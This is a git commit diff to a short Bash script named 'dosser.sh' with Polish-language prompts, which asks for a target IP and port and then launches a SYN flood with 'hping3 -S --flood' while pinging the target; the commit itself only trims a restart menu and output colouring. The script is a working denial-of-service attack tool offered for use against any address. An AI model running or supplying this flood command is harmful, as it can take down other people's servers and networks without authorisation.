b4a9eb82e1c9374525af15ca44448f1da0267360
Michał Kozłowski <51675112+KOZ1OL@users.noreply.github.com>
2022-05-13 19:43:31 +0200

    Update dosser.sh

--- Tools/dosser.sh
+++ Tools/dosser.sh
@@ -1,28 +1,8 @@
 #! /bin/bash
-figlet "DOSSER" | lolcat
+figlet "DOSSER" 
 read -r -p "Wprowadź IP celu - " IP
 read -r -p "Wprowadź port celu - " PORT
 gnome-terminal -- sudo ping $IP
 sudo hping3 -S --flood -V -p $PORT $IP
-while true
-do
- read -r -p "Uruchomić skrypt ponownie ? (y/n) - " start
- 
- case $start in
-     [yY][eE][sS]|[yY])
-  cd ..
-  cd Scripts
-  clear
-  ./main.sh
- break
- ;;
-     [nN][eE][sS]|[nN])
-  echo "Dziękuje za skorzystanie ze skryptu !" | lolcat
-  exit 1
- break
-        ;;
-     *)
- echo "Nieprawidłowa komenda"
-  ;;
-  esac
-done
+echo "Dziękuje za skorzystanie ze skryptu !"
+
